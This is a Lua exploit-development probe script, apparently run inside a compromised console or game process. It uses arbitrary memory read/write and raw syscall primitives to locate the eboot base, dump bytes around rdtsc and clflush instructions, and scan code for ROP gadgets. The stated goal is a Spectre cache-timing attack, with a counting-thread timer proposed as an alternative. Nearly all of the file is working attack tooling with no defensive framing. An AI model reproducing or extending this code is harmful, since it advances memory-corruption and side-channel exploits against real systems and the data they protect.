-- CRASH_CLASS: LOW
-- PROBE 1199f: Read bytes around each rdtsc hit to find usable gadgets
--
-- 1199e found 8 rdtsc hits but no rdtsc;ret. Need to see what follows
-- each rdtsc to find a usable timing gadget for Spectre.
-- Also verify the clflush at +0x1B6B7D.

print("=== PROBE 1199f: rdtsc context dump ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
print(string.format("eboot base: 0x%X%08X", text_hi, text_lo))
print("")

-- Dump 32 bytes around each offset
local function dump_bytes(label, offset, count)
    count = count or 32
    local addr = eboot_base + uint64(offset)
    local hex = {}
    local disasm_hint = {}
    for i = 0, count - 1 do
        local a = addr + uint64(i)
        local dw = safe_rd(a)
        if dw then
            local b = dw % 256
            table.insert(hex, string.format("%02X", b))
        else
            table.insert(hex, "??")
        end
    end
    -- Format as groups of 2
    local line = {}
    for i = 1, #hex do
        table.insert(line, hex[i])
        if i % 16 == 0 then
            print(string.format("  %s +0x%X+%02X: %s", label, offset, i - 16, table.concat(line, " ")))
            line = {}
        end
    end
    if #line > 0 then
        print(string.format("  %s +0x%X+%02X: %s", label, offset, #hex - #line, table.concat(line, " ")))
    end
end

-- rdtsc offsets from 1199e
local rdtsc_offsets = {0x17C42, 0x17C98, 0x2AB56, 0x2ABA2, 0x6A109, 0x6E0D2, 0x6E128}

print("--- rdtsc context (32 bytes from each hit) ---")
for _, off in ipairs(rdtsc_offsets) do
    print(string.format("\n  rdtsc at +0x%X:", off))
    dump_bytes("rdtsc", off, 32)
end

-- clflush at +0x1B6B7D
print(string.format("\n--- clflush context at +0x1B6B7D ---"))
dump_bytes("clflush", 0x1B6B7D, 32)

-- Also look before clflush for context
print(string.format("\n--- clflush context -16 bytes ---"))
dump_bytes("clflush-16", 0x1B6B7D - 16, 48)

-- Now scan specifically for these useful patterns in the first 2MB:
-- Pattern 1: mov [rdi], eax; ret = 89 07 C3 (store rdtsc low to [rdi])
-- Pattern 2: mov [rdi], rax; ret = 48 89 07 C3
-- Pattern 3: mov rax, rdx; ret = 48 89 D0 C3 (move rdtsc high to rax)
-- Pattern 4: shl rdx, 0x20; or rax, rdx; ret = 48 C1 E2 20 48 09 D0 C3
-- Pattern 5: ret = C3 (just need a ret after rdtsc to build ROP)

print("")
print("--- Searching for rdtsc-companion gadgets in first 2MB ---")

local scan_size = 2 * 1024 * 1024

-- Already know: mov [rdi],rax;ret at eboot+0x92C67 (from thr_new work)
print("  Known: mov [rdi],rax;ret at +0x92C67 (from earlier probes)")

-- Search for: mov eax, edx; ret (89 D0 C3) — moves rdtsc high bits to eax
-- and: or rax, rdx; ret (48 09 D0 C3)
local companions = {}

for off = 0, scan_size - 8, 4 do
    local addr = eboot_base + uint64(off)
    local dw = safe_rd(addr)
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- shl rdx, 0x20 = 48 C1 E2 20
        if b0 == 0x48 and b1 == 0xC1 and b2 == 0xE2 and b3 == 0x20 then
            table.insert(companions, {off = off, name = "shl rdx,0x20"})
        end

        -- or rax, rdx; ret = 48 09 D0 C3
        if b0 == 0x48 and b1 == 0x09 and b2 == 0xD0 and b3 == 0xC3 then
            table.insert(companions, {off = off, name = "or rax,rdx;ret"})
        end

        -- mov eax, edx = 89 D0 (2 bytes, check if C3 follows)
        if b0 == 0x89 and b1 == 0xD0 and b2 == 0xC3 then
            table.insert(companions, {off = off, name = "mov eax,edx;ret"})
        end

        -- sub rax, rdx; ret = 48 29 D0 C3
        if b0 == 0x48 and b1 == 0x29 and b2 == 0xD0 and b3 == 0xC3 then
            table.insert(companions, {off = off, name = "sub rax,rdx;ret"})
        end
    end
end

for _, c in ipairs(companions) do
    print(string.format("  FOUND %s at +0x%X", c.name, c.off))
end

if #companions == 0 then
    print("  No companion gadgets found")
end

-- Assess: for Spectre we really just need to TIME a memory access.
-- Alternative to rdtsc;ret: use a counting thread as timer.
-- Child thread increments a shared counter in a tight loop.
-- Parent reads counter before and after the memory access.
-- Difference = timing. No rdtsc needed!
print("")
print("--- Alternative: counting thread timer ---")
print("  Child thread in tight loop: inc [shared_addr]")
print("  Need gadget: inc [rdi]; jmp [loop] or similar")
print("  OR: use socketpair write count as coarse timer")
print("  OR: child ROP chain with known iteration count")

-- Check for inc [rdi]; ret = FF 07 C3
-- or: add [rdi], 1; ret = 48 83 07 01 C3 (add qword [rdi], 1; ret)
print("")
print("--- inc/add gadgets ---")
local inc_gadgets = {}
for off = 0, scan_size - 8, 4 do
    local addr = eboot_base + uint64(off)
    local dw = safe_rd(addr)
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- inc dword [rdi]; ret = FF 07 C3
        if b0 == 0xFF and b1 == 0x07 and b2 == 0xC3 then
            table.insert(inc_gadgets, {off = off, name = "inc [rdi];ret"})
        end

        -- inc qword [rdi]; ret = 48 FF 07 C3
        if b0 == 0x48 and b1 == 0xFF and b2 == 0x07 and b3 == 0xC3 then
            table.insert(inc_gadgets, {off = off, name = "inc qword [rdi];ret"})
        end

        -- add dword [rdi], 1; ret = 83 07 01 C3
        if b0 == 0x83 and b1 == 0x07 and b2 == 0x01 and b3 == 0xC3 then
            table.insert(inc_gadgets, {off = off, name = "add [rdi],1;ret"})
        end
    end
end

for _, g in ipairs(inc_gadgets) do
    print(string.format("  FOUND %s at +0x%X", g.name, g.off))
end
if #inc_gadgets == 0 then
    print("  No inc/add [rdi] gadgets found")
end

print("")
print("=== PROBE 1199f COMPLETE ===")
